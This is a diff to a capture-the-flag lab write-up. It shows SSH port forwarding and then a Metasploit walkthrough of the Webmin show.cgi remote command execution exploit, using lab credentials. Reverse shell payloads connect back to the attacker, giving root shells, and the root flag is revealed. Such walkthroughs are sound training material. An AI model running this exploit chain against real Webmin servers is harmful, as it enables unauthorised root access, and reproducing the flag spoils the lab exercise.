@@ -212,6 +212,10 @@ Given point 10000 is the port of interest on target its possible to use 10000 lo
 To connect to the service on port 10000 on target by port 9000 on localhost we can simply use:
 ssh -L 9000:localhost:10000 <username>@<TargetIP>
 
+you can include flags when connect with these just runs in background:
+Don’t open a shell (-N)
+Run in background (-f)
+
 ## Note this will fail if the proxy from earlier SQLi request capture is still on so be sure to disable it.
 
 ## Q2 What is the name of the exposed CMS?
@@ -224,3 +228,178 @@ Answer: 1.580, login to webmin is the same password as to connect with SSH. Then
 # Task 6 Privilege Escalation with Metasploit
 
 Next take advantage of webadmin to gain by searching for exploit through searchsploit, this lead us to finding a exploit is available through metasploit.
+
+```
+msf > search webmin
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank       Check  Description
+   -   ----                                           ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution                                               
+   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure                                                                       
+   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE                                                                      
+...
+
+msf > use 0
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS localhost
+RHOSTS => localhost
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set RPORT 9000
+RPORT => 9000
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
+USERNAME => agent47
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
+PASSWORD => videogamer124
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => false
+
+msf exploit(unix/webapp/webmin_show_cgi_exec) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
+   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
+   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
+   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   10  payload/cmd/unix/reverse_python             .                normal  No     Unix Command Shell, Reverse TCP (via Python)
+   11  payload/cmd/unix/reverse_python_ssl         .                normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+   12  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   13  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   14  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 8
+
+First I tried rever_perl but this failed i then tried another reverse which seemed to work. Like the hint says its about getting the right payload.
+
+payload => cmd/unix/reverse_perl
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
+lhost => tun0
+msf exploit(unix/webapp/webmin_show_cgi_exec) > run
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 192.168.159.255:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploiting target ::1
+[*] Started reverse TCP handler on 192.168.159.255:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Exploit completed, but no session was created.
+```
+Failed here next tried payload 6:
+```
+msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 6
+payload => cmd/unix/reverse
+msf exploit(unix/webapp/webmin_show_cgi_exec) > run
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP double handler on 192.168.159.255:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo Cer0s8sq1flmMyP1;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "Cer0s8sq1flmMyP1\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.159.255:4444 -> 10.49.181.12:49764) at 2026-04-29 14:25:21 +1000
+[*] Session 1 created in the background.
+[*] Exploiting target ::1
+[*] Started reverse TCP double handler on 192.168.159.255:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[+] Payload executed successfully
+[*] Command: echo kIzoCXjnV7tiqvh0;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "kIzoCXjnV7tiqvh0\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 2 opened (192.168.159.255:4444 -> 10.49.181.12:49772) at 2026-04-29 14:25:31 +1000
+[*] Session 2 created in the background.
+```
+Success!
+```
+msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
+                                         0.0.1)
+  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)
+
+msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 2
+[*] Starting interaction with 2...
+
+whoami
+root
+pwd
+/usr/share/webmin/file/
+cd /root
+pwd
+/root
+ls
+root.txt
+cat root.txt
+a4b945830144bdd71908d12d902adeee
+```
+## Q1 What is the root flag?
+Answer: a4b945830144bdd71908d12d902adeee
+Double check session I assumed failed and it actually worked.
+```
+Background session 2? [y/N]  y
+msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
+                                         0.0.1)
+  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)
+
+msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
+[*] Starting interaction with 1...
+
+whoami
+root
+cd /root
+pwd
+/root
+ls
+root.txt
+```
+
+```
